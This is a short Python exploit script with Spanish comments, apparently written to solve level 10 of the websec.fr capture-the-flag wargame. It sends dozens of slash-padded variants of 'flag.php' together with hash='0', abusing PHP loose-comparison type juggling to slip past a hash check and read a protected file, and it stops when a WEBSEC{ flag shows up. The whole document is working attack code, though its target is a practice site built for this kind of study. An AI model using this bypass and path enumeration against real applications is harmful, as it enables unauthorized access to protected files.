#!/usr/bin/env python3
import requests
import time

url = "https://websec.fr/level10/index.php"

# Probar con type juggling: enviar diferentes variaciones de paths
paths_to_try = []

# Generar paths con diferentes números de slashes
for i in range(1, 30):
    paths_to_try.append("/" * i + "flag.php")
    paths_to_try.append("." + "/" * i + "flag.php")
    
# Paths relativos
paths_to_try.extend([
    "./flag.php",
    "../level10/flag.php",
    ".//flag.php",
    "././flag.php",
])

print(f"Probando {len(paths_to_try)} variaciones...")

for i, path in enumerate(paths_to_try):
    if i % 10 == 0:
        print(f"Progreso: {i}/{len(paths_to_try)}")
    
    # Probar con hash "0" (type juggling)
    try:
        r = requests.get(url, params={"f": path, "hash": "0"}, timeout=5)
        
        if "WEBSEC{" in r.text:
            print(f"\n¡ENCONTRADO con hash=0!")
            print(f"Path: {path}")
            flag = r.text[r.text.find("WEBSEC{"):r.text.find("}")+1]
            print(f"FLAG: {flag}")
            break
        elif "Permission denied" not in r.text and len(r.text) > 2000:
            print(f"Respuesta interesante para path={path}")
    except:
        continue
    
    time.sleep(0.1)
    
print("Búsqueda completada.")